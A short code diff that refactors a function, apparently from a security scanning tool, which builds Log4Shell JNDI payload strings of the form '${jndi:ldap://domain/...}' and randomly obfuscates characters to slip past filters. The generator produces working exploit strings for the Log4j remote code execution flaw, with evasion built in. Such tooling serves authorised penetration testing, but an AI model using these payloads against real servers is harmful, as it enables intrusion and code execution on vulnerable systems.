@@ -5,16 +5,14 @@ from xing.utils import random_choices
 
 def gen_log4j_payload(domain, payload_type=random_choices(4)):
     chars = f"${{jndi:ldap://{domain}/{payload_type}}}"
-    lst = []
-    for char in chars:
-        use = not getrandbits(1)
-        if char == "$" or char == "{" or char == "}":
-            use = False
-        if use:
-            lst.append(confuse_chars(char))
-        else:
-            lst.append(char)
-    return ''.join([str(s) for s in lst])
+    lst = [
+        confuse_chars(char)
+        if char not in "${}"
+        and not getrandbits(1)
+        else char
+        for char in chars
+    ]
+    return ''.join(str(s) for s in lst)
 
 
 def confuse_chars(char):
